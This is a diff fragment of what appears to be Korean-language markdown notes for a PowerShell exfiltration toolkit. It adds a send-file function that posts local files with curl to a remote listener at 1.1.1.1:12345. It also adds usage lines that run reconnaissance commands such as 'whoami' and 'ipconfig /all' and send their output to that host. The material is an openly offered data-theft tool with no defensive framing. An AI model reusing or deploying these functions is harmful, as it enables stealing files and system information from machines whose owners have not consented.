@@ -33,11 +33,22 @@ function send-data {
     curl.exe -s -X POST "$BaseUrl/$fname" -d $result
 }
 
-function send-data {
+function send-file {
     param($FilePath, $BaseUrl = "http://1.1.1.1:12345")
     $fname = Split-Path $FilePath -Leaf   # 원본 파일명 + 확장자 그대로
     curl.exe -s -X POST "$BaseUrl/$fname" -F "file=@$FilePath"
 }
+```
+
+명령어 입력은 아래 처럼 수행
+```powershell
+#데이터
+send-data whoami
+send-data "ipconfig /all"
+
+#파일
+send-file C:\Path\file_name (절대경로)
+send-file file_name (현재경로)
 ```
 
 ### 2. curl_request.bat
